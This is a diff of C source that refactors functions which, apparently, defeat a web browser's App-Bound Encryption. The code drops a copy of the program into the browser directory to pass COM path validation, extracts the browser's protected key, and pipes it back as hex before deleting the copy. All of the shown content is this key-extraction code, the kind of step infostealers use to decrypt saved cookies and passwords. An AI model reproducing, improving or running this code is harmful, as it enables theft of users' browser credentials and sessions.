@@ -3,37 +3,41 @@
 /*** method: Drop (copy self into the browser dir so COM path validation passes) ***/
 
 /* Drop child: runs from the browser directory, writes the key to the stdout pipe */
+_Success_(return)
 BOOL
 AbeDropChild(
-    _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex)
+    _In_ const NET_BROWSER_INFO* Browser)
 {
-    CHAR Line[128];
+    CHAR Line[ABE_KEY_SIZE * 2 + 16];
     HANDLE StdOut;
-    ULONG i, Length;
+    ULONG Length;
 
     RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
     g_Pending = 0;
     g_Code = (LONG)E_FAIL;
-    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
+    if (!AbePrepareRequest(Browser))
+    {
+        return FALSE;
+    }
     AbePayloadWorker();
-    if (g_Code != 0) return FALSE;
+    if (g_Code != 0)
+    {
+        return FALSE;
+    }
 
     Length = Str_PrintfExA(Line, sizeof(Line), "KEY=");
-    for (i = 0; i < ABE_KEY_SIZE; i++)
-    {
-        Length += Str_PrintfExA(Line + Length, sizeof(Line) - Length, "%02X", g_Key[i]);
-    }
+    AbeFormatKeyHex((const BYTE*)g_Key, Line + Length);
+    Length += ABE_KEY_SIZE * 2;
     Str_PrintfExA(Line + Length, sizeof(Line) - Length, "\n");
     StdOut = IO_ConGetStdOutput();
     return StdOut != NULL &&
            NT_SUCCESS(IO_WriteFile(StdOut, NULL, Line, (ULONG)Str_SizeA(Line), NULL));
 }
 
+_Success_(return)
 BOOL
 AbeGetKeyDrop(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     static UNICODE_STRING NamedPipeDir = RTL_CONSTANT_STRING(L"\\Device\\NamedPipe");
@@ -69,8 +73,14 @@ AbeGetKeyDrop(
         !NT_SUCCESS(IO_CreatePipe(PipeDir, &ReadPipe, &WritePipe, FILE_PIPE_INBOUND, 0)))
     {
         AbeLog(L"Drop: failed to create pipe\r\n");
-        if (PipeDir != NULL) NtClose(PipeDir);
-        if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);
+        if (PipeDir != NULL)
+        {
+            NtClose(PipeDir);
+        }
+        if (!Str_EqualIW(Self, Copy))
+        {
+            IO_DeleteWin32File(Copy, NULL);
+        }
         return FALSE;
     }
     NtClose(PipeDir);
@@ -84,7 +94,6 @@ AbeGetKeyDrop(
                            sizeof(HandleInfo));
 
     RtlZeroMemory(&Si, sizeof(Si));
-    RtlZeroMemory(&Pi, sizeof(Pi));
     Si.cb = sizeof(Si);
     Si.dwFlags = STARTF_USESTDHANDLES;
     Si.hStdInput = NULL;
@@ -107,7 +116,10 @@ AbeGetKeyDrop(
         AbeLog(L"Drop: failed to create child process, gle=%lu\r\n", Err_GetLastError());
         NtClose(ReadPipe);
         NtClose(WritePipe);
-        if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);
+        if (!Str_EqualIW(Self, Copy))
+        {
+            IO_DeleteWin32File(Copy, NULL);
+        }
         return FALSE;
     }
     NtClose(WritePipe);
@@ -126,7 +138,10 @@ AbeGetKeyDrop(
     NtClose(ReadPipe);
     NtClose(Pi.hThread);
     NtClose(Pi.hProcess);
-    if (!Str_EqualIW(Self, Copy)) IO_DeleteWin32File(Copy, NULL);
+    if (!Str_EqualIW(Self, Copy))
+    {
+        IO_DeleteWin32File(Copy, NULL);
+    }
 
     /* locate "KEY=" byte-wise: the stream may embed NUL terminators */
     for (i = 0; i + 4 + ABE_KEY_SIZE * 2 <= Total; i++)
@@ -148,7 +163,10 @@ AbeGetKeyDrop(
         INT Hi = Line[i * 2] <= '9' ? Line[i * 2] - '0' : Line[i * 2] - 'A' + 10;
         INT Lo = Line[i * 2 + 1] <= '9' ? Line[i * 2 + 1] - '0' : Line[i * 2 + 1] - 'A' + 10;
 
-        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15) return FALSE;
+        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15)
+        {
+            return FALSE;
+        }
         Key[i] = (BYTE)((Hi << 4) | Lo);
     }
     return TRUE;
